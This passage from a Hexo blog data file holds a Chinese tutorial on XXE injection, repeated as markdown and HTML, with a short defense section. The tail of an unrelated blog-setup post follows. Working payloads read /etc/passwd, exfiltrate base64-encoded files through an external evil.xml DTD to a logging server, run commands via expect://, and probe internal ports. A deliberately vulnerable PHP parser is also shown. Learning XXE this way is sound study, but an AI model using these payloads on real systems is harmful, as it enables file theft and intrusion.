\"file:///S://aa.txt\">]><note>&xxe;</note>` \n\n![](S:\\hexo\\myblog\\source\\_posts\\XXE\\QQ截图20190301133421.png)\n\n![](XXE\\QQ截图20190301133122.png)\n\n**无回显的情况：**\n\n`%file;`会调用php插件对要读取的文件内容进行Base64编码。\n\n`%dtd;`会请求我们编写好的`evil.xml`文件，会被`evil.xml`文件内容替换。\n\n`%payload;`被`<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>`替换。\n\n`%send;`会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看`http`的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。\n\nPayload:\n\n```xml-dtd\n<!DOCTYPE note [ \n  <!ELEMENT note ANY >\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/S:/test.txt\">\n  <!ENTITY % dtd SYSTEM \"http://localhost/evil.xml\">\n  %dtd; %payload; %send;  ]>\n```\n\n`evil.xml`文件内容：内部`send`的`%`要用实体：`&#x25;`\n\n```xml-dtd\n<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>\"> \n```\n\n`http`访问日志：（到配置文件`http.conf`里找到`CustomLog \"logs/access.log\" common`并删除掉`#`号注释）\n\n![](XXE\\QQ截图20190301152037.png)\n\n**PS:**之所以要引入文件`evil.xml`原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。\n\nBase64解码：\n\n![](XXE\\QQ截图20190301152528.png)\n\n**2.命令执行：**\n\n安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。\n\n[expect](http://php.net/manual/zh/wrappers.expect.php)封装协议默认未开启。\n\nPayload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"expect://whoami\"> ]><x>&xxe;</x>`\n\n**3.内网端口探测：**\n\nPayload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"http://localhost:81\"> ]><x>%26xxe;</x>`\n\n## 0x04 漏洞防御\n\n- 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。\n- 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。\n- 在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。\n- 使用开发语言提供的禁用外部实体的方法。\n\n**参考链接：**\n\nhttps://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md\n\nhttps://www.cnblogs.com/backlion/p/9302528.html\n\nhttps://www.jianshu.com/p/77f2181587a4","slug":"XXE","published":1,"updated":"2019-03-22T03:57:54.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83kx002c7or0r2y652js","content":"<h2 id=\"0x00-必备XML基础知识\"><a href=\"#0x00-必备XML基础知识\" class=\"headerlink\" title=\"0x00 必备XML基础知识\"></a>0x00 必备XML基础知识</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>\n<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。</p>\n<a id=\"more\"></a>\n<p><img src=\"/2019/03/01/XXE/InkedQQ截图20190301091748_LI.jpg\" alt></p>\n<p>更多XML基础知识跳转<a href=\"https://sakuxa.com/2019/02/28/xml/\">这里</a>。</p>\n<h2 id=\"0x01-XXE漏洞概述\"><a href=\"#0x01-XXE漏洞概述\" class=\"headerlink\" title=\"0x01 XXE漏洞概述\"></a>0x01 XXE漏洞概述</h2><p>XXE -“xml external entity injection”即”xml外部实体注入漏洞”。</p>\n<p>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>\n<p>在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 </p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301093413.png\" alt></p>\n<p><strong>漏洞检测：</strong></p>\n<p>首先，检测XML是否会被解析。<code>&amp;xxe;</code>是否会被解析为”this is xxe”.(注意：GET请求时记得把<code>&amp;</code>进行URL编码)</p>\n<blockquote>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;this is xxe..&quot;&gt; ]&gt; &lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n</blockquote>\n<p>然后，检测服务器是否支持外部实体。执行Payload后查看<code>test.com</code>服务器的http访问日志，看是否存在<code>GET /xxe_test HTTP/1.0</code>的请求，若存在则证明支持外部实体。</p>\n<blockquote>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM  &quot;http://test.com/xxe_test&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n</blockquote>\n<h2 id=\"0x02-恶意引入外部实体\"><a href=\"#0x02-恶意引入外部实体\" class=\"headerlink\" title=\"0x02 恶意引入外部实体\"></a>0x02 恶意引入外部实体</h2><p><strong>情景一：</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note any&gt;   </span></span><br><span class=\"line\"><span class=\"meta\"> </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;xxe; <span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>情景二：</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note any&gt;   </span></span><br><span class=\"line\"><span class=\"meta\"> </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY % hack SYSTEM \"hack.dtd\" &gt;</span></span><br><span class=\"line\"><span class=\"meta\">  % hack  //会被hack.dtd的内容替换。</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;xxe; <span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>hack.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p><strong>情景三：</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note SYSTEM \"hack.dtd\"&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;xxe; <span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>hack.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p><strong>外部引用实体时，不同的程序可以使用的协议不一样：</strong></p>\n<p><img src=\"/2019/03/01/XXE/15129735161149.png\" alt></p>\n<h2 id=\"0x03-XXE漏洞利用\"><a href=\"#0x03-XXE漏洞利用\" class=\"headerlink\" title=\"0x03 XXE漏洞利用\"></a>0x03 XXE漏洞利用</h2><p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。</p>\n<p>一般XXE利用分为两大场景：有回显和无回显。</p>\n<blockquote>\n<ul>\n<li>有回显的情况可以直接在页面中看到Payload的执行结果或现象。</li>\n<li>无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。</li>\n</ul>\n</blockquote>\n<p>基本漏洞源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $xml=simplexml_load_string($_REQUEST[<span class=\"string\">'xml'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;$xml&lt;/p&gt;\"</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>1.任意文件读取：</strong></p>\n<p><strong>有回显的情况：</strong></p>\n<p>Payload:<code>&lt;!DOCTYPE note [&lt;!ELEMENT note ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///S://aa.txt&quot;&gt;]&gt;&lt;note&gt;&amp;xxe;&lt;/note&gt;</code> </p>\n<p><img src=\"/2019/03/01/XXE/S:/hexo\\myblog\\source\\_posts\\XXE\\QQ截图20190301133421.png\" alt></p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301133122.png\" alt></p>\n<p><strong>无回显的情况：</strong></p>\n<p><code>%file;</code>会调用php插件对要读取的文件内容进行Base64编码。</p>\n<p><code>%dtd;</code>会请求我们编写好的<code>evil.xml</code>文件，会被<code>evil.xml</code>文件内容替换。</p>\n<p><code>%payload;</code>被<code>&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;</code>替换。</p>\n<p><code>%send;</code>会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看<code>http</code>的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。</p>\n<p>Payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE note [ </span><br><span class=\"line\">  &lt;!ELEMENT note ANY &gt;</span><br><span class=\"line\">  &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/S:/test.txt&quot;&gt;</span><br><span class=\"line\">  &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class=\"line\">  %dtd; %payload; %send;  ]&gt;</span><br></pre></td></tr></table></figure>\n<p><code>evil.xml</code>文件内容：内部<code>send</code>的<code>%</code>要用实体：<code>&amp;#x25;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost/?content=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><code>http</code>访问日志：（到配置文件<code>http.conf</code>里找到<code>CustomLog &quot;logs/access.log&quot; common</code>并删除掉<code>#</code>号注释）</p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301152037.png\" alt></p>\n<p><strong>PS:</strong>之所以要引入文件<code>evil.xml</code>原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>\n<p>Base64解码：</p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301152528.png\" alt></p>\n<p><strong>2.命令执行：</strong></p>\n<p>安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。</p>\n<p><a href=\"http://php.net/manual/zh/wrappers.expect.php\" target=\"_blank\" rel=\"noopener\">expect</a>封装协议默认未开启。</p>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://whoami&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n<p><strong>3.内网端口探测：</strong></p>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://localhost:81&quot;&gt; ]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;</code></p>\n<h2 id=\"0x04-漏洞防御\"><a href=\"#0x04-漏洞防御\" class=\"headerlink\" title=\"0x04 漏洞防御\"></a>0x04 漏洞防御</h2><ul>\n<li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。</li>\n<li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。</li>\n<li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</li>\n<li>使用开发语言提供的禁用外部实体的方法。</li>\n</ul>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md\" target=\"_blank\" rel=\"noopener\">https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md</a></p>\n<p><a href=\"https://www.cnblogs.com/backlion/p/9302528.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/backlion/p/9302528.html</a></p>\n<p><a href=\"https://www.jianshu.com/p/77f2181587a4\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/77f2181587a4</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-必备XML基础知识\"><a href=\"#0x00-必备XML基础知识\" class=\"headerlink\" title=\"0x00 必备XML基础知识\"></a>0x00 必备XML基础知识</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>\n<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。</p>","more":"<p><img src=\"/2019/03/01/XXE/InkedQQ截图20190301091748_LI.jpg\" alt></p>\n<p>更多XML基础知识跳转<a href=\"https://sakuxa.com/2019/02/28/xml/\">这里</a>。</p>\n<h2 id=\"0x01-XXE漏洞概述\"><a href=\"#0x01-XXE漏洞概述\" class=\"headerlink\" title=\"0x01 XXE漏洞概述\"></a>0x01 XXE漏洞概述</h2><p>XXE -“xml external entity injection”即”xml外部实体注入漏洞”。</p>\n<p>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>\n<p>在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 </p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301093413.png\" alt></p>\n<p><strong>漏洞检测：</strong></p>\n<p>首先，检测XML是否会被解析。<code>&amp;xxe;</code>是否会被解析为”this is xxe”.(注意：GET请求时记得把<code>&amp;</code>进行URL编码)</p>\n<blockquote>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;this is xxe..&quot;&gt; ]&gt; &lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n</blockquote>\n<p>然后，检测服务器是否支持外部实体。执行Payload后查看<code>test.com</code>服务器的http访问日志，看是否存在<code>GET /xxe_test HTTP/1.0</code>的请求，若存在则证明支持外部实体。</p>\n<blockquote>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM  &quot;http://test.com/xxe_test&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n</blockquote>\n<h2 id=\"0x02-恶意引入外部实体\"><a href=\"#0x02-恶意引入外部实体\" class=\"headerlink\" title=\"0x02 恶意引入外部实体\"></a>0x02 恶意引入外部实体</h2><p><strong>情景一：</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note any&gt;   </span></span><br><span class=\"line\"><span class=\"meta\"> </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;xxe; <span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>情景二：</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note any&gt;   </span></span><br><span class=\"line\"><span class=\"meta\"> </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY % hack SYSTEM \"hack.dtd\" &gt;</span></span><br><span class=\"line\"><span class=\"meta\">  % hack  //会被hack.dtd的内容替换。</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;xxe; <span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>hack.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p><strong>情景三：</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note SYSTEM \"hack.dtd\"&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;xxe; <span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>hack.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p><strong>外部引用实体时，不同的程序可以使用的协议不一样：</strong></p>\n<p><img src=\"/2019/03/01/XXE/15129735161149.png\" alt></p>\n<h2 id=\"0x03-XXE漏洞利用\"><a href=\"#0x03-XXE漏洞利用\" class=\"headerlink\" title=\"0x03 XXE漏洞利用\"></a>0x03 XXE漏洞利用</h2><p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。</p>\n<p>一般XXE利用分为两大场景：有回显和无回显。</p>\n<blockquote>\n<ul>\n<li>有回显的情况可以直接在页面中看到Payload的执行结果或现象。</li>\n<li>无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。</li>\n</ul>\n</blockquote>\n<p>基本漏洞源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $xml=simplexml_load_string($_REQUEST[<span class=\"string\">'xml'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;$xml&lt;/p&gt;\"</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>1.任意文件读取：</strong></p>\n<p><strong>有回显的情况：</strong></p>\n<p>Payload:<code>&lt;!DOCTYPE note [&lt;!ELEMENT note ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///S://aa.txt&quot;&gt;]&gt;&lt;note&gt;&amp;xxe;&lt;/note&gt;</code> </p>\n<p><img src=\"/2019/03/01/XXE/S:/hexo\\myblog\\source\\_posts\\XXE\\QQ截图20190301133421.png\" alt></p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301133122.png\" alt></p>\n<p><strong>无回显的情况：</strong></p>\n<p><code>%file;</code>会调用php插件对要读取的文件内容进行Base64编码。</p>\n<p><code>%dtd;</code>会请求我们编写好的<code>evil.xml</code>文件，会被<code>evil.xml</code>文件内容替换。</p>\n<p><code>%payload;</code>被<code>&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;</code>替换。</p>\n<p><code>%send;</code>会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看<code>http</code>的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。</p>\n<p>Payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE note [ </span><br><span class=\"line\">  &lt;!ELEMENT note ANY &gt;</span><br><span class=\"line\">  &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/S:/test.txt&quot;&gt;</span><br><span class=\"line\">  &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class=\"line\">  %dtd; %payload; %send;  ]&gt;</span><br></pre></td></tr></table></figure>\n<p><code>evil.xml</code>文件内容：内部<code>send</code>的<code>%</code>要用实体：<code>&amp;#x25;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost/?content=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><code>http</code>访问日志：（到配置文件<code>http.conf</code>里找到<code>CustomLog &quot;logs/access.log&quot; common</code>并删除掉<code>#</code>号注释）</p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301152037.png\" alt></p>\n<p><strong>PS:</strong>之所以要引入文件<code>evil.xml</code>原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>\n<p>Base64解码：</p>\n<p><img src=\"/2019/03/01/XXE/QQ截图20190301152528.png\" alt></p>\n<p><strong>2.命令执行：</strong></p>\n<p>安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。</p>\n<p><a href=\"http://php.net/manual/zh/wrappers.expect.php\" target=\"_blank\" rel=\"noopener\">expect</a>封装协议默认未开启。</p>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://whoami&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>\n<p><strong>3.内网端口探测：</strong></p>\n<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://localhost:81&quot;&gt; ]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;</code></p>\n<h2 id=\"0x04-漏洞防御\"><a href=\"#0x04-漏洞防御\" class=\"headerlink\" title=\"0x04 漏洞防御\"></a>0x04 漏洞防御</h2><ul>\n<li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。</li>\n<li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。</li>\n<li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</li>\n<li>使用开发语言提供的禁用外部实体的方法。</li>\n</ul>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md\" target=\"_blank\" rel=\"noopener\">https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md</a></p>\n<p><a href=\"https://www.cnblogs.com/backlion/p/9302528.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/backlion/p/9302528.html</a></p>\n<p><a href=\"https://www.jianshu.com/p/77f2181587a4\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/77f2181587a4</a></p>"},{"title":"博客搭建记录 Node.js + Hexo + Yelee + Git Pages","date":"2019-02-21T06:32:04.000Z","_content":"\n## 0x00 概述\n\n本博客采用Node.js + Hexo + Yelee + Git Pages方案。\n\n博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。\n\n博客搭建可分为四部分：\n\n- Hexo安装及使用\n- Hexo配置\n- Hexo联合Git Pages部署\n- 绑定个人域名（可选）\n\n<!-- more -->\n\n## 0x01 Hexo安装\n\n> Hexo 是一个快速、简洁且高效的博客框架。\n>\n> Hexo 使用 [Markdown](http://daringfireball.net/projects/markdown/)（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n**1.安装Node.js与Git**\n\n*Node*.*js* 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。\n\nGit用于进行版本控制。\n\n使用命令`node -v`及其`git version`验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。\n\n**2.安装Hexo**\n\n安装命令：\n\n`npm install -g hexo-cli`\n\n> npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。\n\n初始化博客：\n\n`hexo init myblog`\t\t //myblog是可以任意取的。\n\n安装依赖：\n\n`cd myblog`\t\t //进入这个myblog文件夹\n`npm install`\t\t//npm会根据目录下的package.json文件安装所需要的依赖。\n\n完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)：\n\n> - public                            //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。\n> - scaffolds                      //该文件夹下存放文章、页面等的模板。\n> - source\\posts              //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。\n> - themes                     //存放网页主题的目录。\n> - _config.yml             //Hexo配置文件。\n\n运行博客：\n\n`hexo   g` \t\t     //等价于`hexo generate`，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。\n\n`hexo  s`\t\t   //等价于`hexo 